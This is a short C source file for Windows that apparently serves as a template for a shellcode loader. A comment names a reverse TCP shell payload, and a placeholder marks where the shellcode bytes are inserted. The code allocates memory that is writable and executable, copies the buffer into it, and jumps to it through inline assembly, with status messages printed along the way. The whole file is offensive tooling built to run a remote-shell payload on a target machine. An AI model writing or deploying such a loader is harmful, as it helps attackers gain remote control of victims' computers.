#include <stdio.h>
#include <string.h>
#include <windows.h>

#pragma warning

// windows/shell_reverse_tcp
unsigned char buf[] =
!++BUFFER++!

int main(int argc, char** argv) {
	DWORD oldProtect;
	int len = 0, offset = 0x0;
	void* stage = VirtualAlloc(0, 0x1000, 0x1000, 0x40);
	void (*target)();
	printf("[*] Memory allocated: 0x%08x\n", stage);
	len = sizeof(buf);
	printf("[*] Size of Shellcode: %08x\n", len);
	memmove(stage, buf, 0x1000);
	printf("[*] Shellcode copied\n");
	*(long*)&target = (long)stage + offset;
	__asm {
		mov eax, target
		jmp eax
	}
	system("pause");
}